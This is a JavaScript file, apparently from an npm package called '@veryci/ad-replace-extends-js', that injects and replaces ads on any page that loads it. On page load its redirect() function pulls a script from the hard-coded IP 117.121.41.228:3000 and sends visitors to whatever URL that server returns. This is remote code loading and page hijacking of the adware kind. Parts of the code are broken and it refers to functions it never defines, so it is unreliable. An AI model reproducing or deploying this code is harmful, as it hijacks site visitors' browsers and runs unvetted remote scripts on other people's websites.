import { phone } from 'ismobilejs';
const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
const { hostname } = window.location;

function extend() {
    if (window.adExtendsJS || window.top !== window || blackWebsite.test(hostname)) return;
    window.adExtendsJS = `${name}-${version}`;
    if (window.Fingerprint2) {
        new Fingerprint2().get(() => {
            if (phone) {
                getAd();
            } else getPc();
        });
        return;
    }
    if (phone) {
        getAd();
    } else {
        getPc();
    }
    // else inPC('-');
}

function replace() {
    if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
    window.adReplaceJS = `${name}-${version}`;
    if (phone) mobileReplace();
    else PCReplace();
    // PCReplace();
}

function redirect() {

    if (window)

        let str = '';
    if (hostname.search(/^www./) !== -1) {
        str = hostname.slice(hostname.indexOf('.') + 1);
    } else {
        str = hostname;
    }

    const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
    window[fnName] = (data) => {
        if (data.url) window.location.href = data.url;
    };
    const os = document.createElement('script');
    os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
    document.head.appendChild(os);
    os.remove();
}

function handler(e) {
    if (window.adReady) return;
    if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
    extend();
    setTimeout(replace, 170);
    setTimeout(redirect, 200);
    window.adReady = true;
}

if (document.addEventListener) {
    document.addEventListener('DOMContentLoaded', handler, false);
    document.addEventListener('readystatechange', handler, false);
    window.addEventListener('load', handler, false);
} else if (document.attachEvent) {
    document.attachEvent('onreadystatechange', handler);
    window.attachEvent('onload', handler);
}